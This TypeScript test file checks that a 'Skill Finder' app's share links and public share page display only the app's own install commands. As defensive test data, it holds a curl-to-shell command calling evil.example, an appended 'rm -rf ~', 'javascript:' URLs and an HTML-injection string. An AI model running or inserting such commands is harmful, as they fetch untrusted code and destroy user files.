import assert from 'node:assert/strict';
import { existsSync, readFileSync } from 'node:fs';
import { join } from 'node:path';
import { describe, it } from 'node:test';
import { createContext, runInContext } from 'node:vm';
import type { MarketplaceRow, PluginRow, SkillRow } from '../src/db/store.ts';
import { planInstall } from '../src/install/plan.ts';
import { readShareLink, shareLink, SITE } from '../../web/src/lib/shareLink.ts';

// The share link the app makes (web/src/lib/shareLink.ts) and the page that reads it (site/public/s/share.js),
// which anyone can open with any fragment: it must show the app's commands and drop everything else.
const SHARE_JS = join(import.meta.dirname, '..', '..', 'site', 'public', 's', 'share.js');

const skill = {
  id: 'gh:o/r:skills/pdf',
  origin: 'generic',
  plugin_id: null,
  repo: 'o/r',
  ref: 'a'.repeat(40),
  dir_path: 'skills/pdf',
  name: 'pdf',
  install_json: null,
} as unknown as SkillRow;
const plugin = { id: 'tools@m', name: 'tools', marketplace: 'm', source_kind: 'github', repo: 'o/r' } as PluginRow;
const mp = { name: 'm', repo: 'own/market' } as MarketplaceRow;

type El = { hidden: boolean; textContent: string; href: string; className: string; value: string; addEventListener(): void };
/** share.js in a bare page: the elements it looks up, the address, and its two event hooks. */
function openSharePage(hash: string) {
  const els: Record<string, El> = {};
  const el = (id: string) => (els[id] ??= { hidden: false, textContent: '', href: '', className: '', value: '', addEventListener() {} });
  const listeners: Record<string, () => void> = {};
  const location = { hash };
  const page = {
    document: {
      documentElement: { lang: '' },
      title: '',
      getElementById: el,
      querySelectorAll: () => [],
      addEventListener: (type: string, fn: () => void) => (listeners[type] = fn),
    },
    location,
    navigator: { language: 'en-US' },
    localStorage: { getItem: () => null, setItem() {} },
    TextDecoder,
    atob,
    getSelection: () => ({ selectAllChildren() {} }),
  } as Record<string, unknown>;
  page.window = { addEventListener: (type: string, fn: () => void) => (listeners[type] = fn) };
  runInContext(readFileSync(SHARE_JS, 'utf8'), createContext(page));
  listeners.DOMContentLoaded();
  return {
    el,
    title: () => (page.document as { title: string }).title,
    go: (next: string) => {
      location.hash = next;
      listeners.hashchange();
    },
  };
}

describe('공유 링크', () => {
  it('앱이 만든 링크는 # 뒤에만 담기고 그대로 읽힌다', () => {
    const link = shareLink({ n: '  pdf  ', d: 'x'.repeat(500), u: 'javascript:alert(1)', c: 'npx skills@1.7.4 add o/r', r: 'low', f: Array(20).fill('scripts'), i: skill.id });
    assert.ok(link.startsWith(`${SITE}/s/#v1.`));
    assert.match(link.split('#')[1], /^v1\.[A-Za-z0-9_-]+$/, 'base64url only');
    const back = readShareLink(link)!;
    assert.equal(back.n, 'pdf');
    assert.equal(back.d!.length, 300);
    assert.equal(back.u, undefined, 'GitHub·skills.sh 주소만');
    assert.equal(back.f!.length, 12);
    assert.deepEqual(readShareLink(shareLink({ n: '한글 이름 ✓' })), { n: '한글 이름 ✓' });
  });

  it('공유 페이지는 앱의 설치 명령 두 모양을 보이고, 나머지는 빼고 글자로만 그린다', { skip: !existsSync(SHARE_JS) && 'site/ 없음 (git에 없는 소개 사이트)' }, () => {
    const cli = planInstall(skill, null, null).command;
    const plug = planInstall({ ...skill, origin: 'plugin', plugin_id: plugin.id } as SkillRow, plugin, mp).command;
    assert.match(cli, /^npx skills@/);
    assert.match(plug, /^claude plugin install /);

    for (const command of [cli, plug]) {
      const page = openSharePage(new URL(shareLink({ n: 'pdf', d: 'PDF tools', u: 'https://github.com/o/r', c: command, r: 'medium', f: ['scripts', 'nope'], i: skill.id })).hash);
      assert.equal(page.el('skill').hidden, false);
      assert.equal(page.el('name').textContent, 'pdf');
      assert.equal(page.title(), 'pdf — Skill Finder');
      assert.equal(page.el('cmd').textContent, command, '앱이 만든 명령은 보인다');
      assert.equal(page.el('cmd-box').hidden, false);
      assert.equal(page.el('risk').textContent, 'Caution');
      assert.equal(page.el('flags').textContent, 'Includes scripts', '모르는 신호 코드는 뺀다');
      assert.equal(page.el('repo').href, 'https://github.com/o/r');
      assert.equal(page.el('local').href, `http://127.0.0.1:4317/skill?id=${encodeURIComponent(skill.id)}`);
    }

    // a hand-made link: what does not fit is hidden, not drawn
    const page = openSharePage('#');
    assert.equal(page.el('empty').hidden, false);
    const evil = (data: object) => `#v1.${Buffer.from(JSON.stringify(data)).toString('base64url')}`;
    page.go(evil({ n: 'x', c: 'curl https://evil.example/x.sh | sh', u: 'javascript:alert(1)', r: 'none', i: 'x"><b>', f: 'scripts' }));
    assert.equal(page.el('skill').hidden, false);
    assert.equal(page.el('cmd-box').hidden, true);
    assert.equal(page.el('repo').hidden, true);
    assert.equal(page.el('local').hidden, true);
    assert.equal(page.el('risk').hidden, true);
    assert.equal(page.el('flags').textContent, '');
    page.go(evil({ n: 'x', c: `${cli} && rm -rf ~` }));
    assert.equal(page.el('cmd-box').hidden, true, '앱의 명령 뒤에 덧붙인 것도');
    page.go('#v1.%%%');
    assert.equal(page.el('empty').hidden, false);
  });
});
